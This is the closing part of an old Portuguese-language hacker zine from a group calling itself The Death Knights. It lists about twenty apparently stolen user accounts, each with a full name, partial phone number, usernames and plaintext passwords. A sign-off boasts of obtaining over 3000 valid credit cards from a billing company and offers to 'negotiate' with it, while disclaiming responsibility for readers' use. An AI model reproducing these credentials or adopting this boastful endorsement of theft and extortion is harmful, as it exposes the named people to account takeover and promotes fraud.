---------------------------------------------------------------------------------
  Nome Completo: Antonio Lisboa Cardoso
  User Name: lisboa                 Senha = 252479
  Fone     : ??? 0234
  1omail   : lisboa                 Senha = 252479
   ----------------------------------------------------------------------------------
     Nome Completo: Frederico Jose Machado Porto 
  User Name: fredjmp                  senha = 586625
  fone: ???-3526
  e-mail: fredjmp                     senha = 586625
  e-mails adicionais:
  e-mail: lucypp                      senha= 586625
  e-mail: aallpp                      senha= 586625 

----------------------------------------------------------------------------------
Nome Completo: Mariana Gomes de M. e Bomfim
  User Name: bomfim                   Senha: 123456
  Telefone : ???-4021
  1o e-mail: bomfim                   Senha: 123456
  2o e-mail: marianagmb               Senha: 654321
  3o e-mail: josejmb                  Senha: 234567
----------------------------------------------------------------------------------
  Nome Completo: Helio Guedes de Campos Barros
  User Name: heliobarros              Senha:h12300
  Telefone : ???-3290
  1o e-mail: hbarros                  Senha:hl2300
  2o e-mail: duda                     Senha:duda50
  3o e-mail: lbarros                  Senha:luis40
----------------------------------------------------------------------------
Nome Completo= Nicio Oliveira Júnior
telefone= ???-0311
useri= nicio     senha= bsbad627
e-mail= baldoni  senha=bsbad627]
-------------------------------------------------------------------------
Nome Completo = Osvaldo de OLiveira Filho 
User Name     = ofilho       Senha = cbarao 
Fone          = ??? 4483
1omail        = casadobarao  Senha = cbarao
-----------------------------------------------------------------------
Nome Completo = Liliane Bezerra da C. Fontenelle
User Name     = lilianebrf   Senha = 358729
Fone          = ??? 3081
1omail        = lilianebrf   Senah = 358729
-------------------------------------------------------------------------
Nome Completo = Osvaldo de OLiveira Filho 
User Name     = ofilho       Senha = cbarao 
Fone          = ??? 4483
1omail        = casadobarao  Senha = cbarao

-------------------------------------------------------------------------------------

Nome Completo = Marcia Cenira de O. Castro Silva 
User Name     = mercia             Senha = 272221
Fone          = ??? 7302
1omail        = mercia             Senha = 272221
-------------------------------------------------------------------------------------
Nome Completo = William Alves de Faria 
User Name     = will      Senha = 021068
Fone          = ??? 4554
1omail        = will      Senha = 021068
-------------------------------------------------------------------------------------
Nome Completo: Francivalda Petrucci
  User name: petrucci                 Senha: petrucci
  Telefone : ???-4884
  1o E-mail: petrucci                 Senha: petrucci
-------------------------------------------------------------------------------------

Nome Completo= Ana America Goncalves Silva
  User Name    = america      Senha = 697807
  fone         = ??? 5906     
  1oMail       = america      Senha = alegria
--------------------------------------------------------------------------
Nome Completo= Cilma Helena V. Blumm Ferreira
  User Name    = blumm        Senha = faca39590s
  Fone         = ??? 3791  
  1o mail      = ferbl        Senha = faca39590s
  2o mail      = cilma        Senha = faca39590s
----------------------------------------------------------------------------
4-Nome Completo= Marilene Dias de Souza
  User Name    = mds          Senha = ccc3331
  1o mail      = mds          Senha = ccc3331
-----------------------------------------------------------------------------
nome completo = gilvania conceicao Borges 
telefone = ???-2735
userid = Gilvania      senha = gilvania 
e-mail= gilvania       senha =gilvania 
e mail adicionais = gilmar   senha=gilmar
---------------------------------------------------------------------------------

nome completo= grimaldo b.da silva 
userid= grimaldo    senha=110370
e-mail=grimaldo      senha = 110307
fone= ???-2987
---------------------------------------------------------------------------------

nome completo = Sempre-Maternal e jardim de infancia 
userid= sempre    senha=121604
e-mail= lilisa    senha=121604
e-mail=mines      senha=121604
fone= ???-4108
----------------------------------------------------------------------------------
Nome Completo = Angela Nobrega de Sa 
User Name     = juacyr.angela                Senha: 27302509
1o e-mail: juacyr.angela                     Senha: 27302509
Telefone: ???-3906
----------------------------------------------------------------------------------

Nome completo: Jorge de M. Borges
User name: jmorais                          Senha: t2d2m5g7
1o e-mail: jmorais                          Senha: t2d2m5g7
Telefone: ???-1051


        Ta axando pouco? Tenho que guardar umas pros members... hehehe :P

-=[  15  ]=-
.-----------.
| FEW WORDS  \_______________________________________________________________
`----------------------------------------------------------------------------'
                                 by Cacaio


                                               De uma olhada em nossa page!
                                               http://www.deathknights.com

        Prez/founder: Cacaio


        Se voce quiser se tornar um membro, esqueca, ja temos muitos
        membros.

        AVISO NOVAMENTE:

       O grupo The Death Knights nao visa nenhum fim lucrativo. Qualquer uso
       das informacoes contidas aqui nao e de nossa responsabilidade. Se voce
       fizer algo descrito e se der mal, problema seu. Nos ensinamos, mas nao
       pedimos para usarem o conhecimento adquirido com este zine.

     E para terminar, nosso sincero ao Internet Billing Company, por nos dar
     mais de 3000 cartoes de credito bons, por usar um sistema de encriptacao
     de apenas 32 caracteres. Se nao quiserem que usemos os cartoes, entrem
     em contato conosco e poderemos negociar. (19/04)



        Ate' o proximo numero!


 ______________________________Death_Knights_________________________________
 ----------------------------------------------------------------------------

                            Criticas? Sugestoes?


                           death@deathknights.com
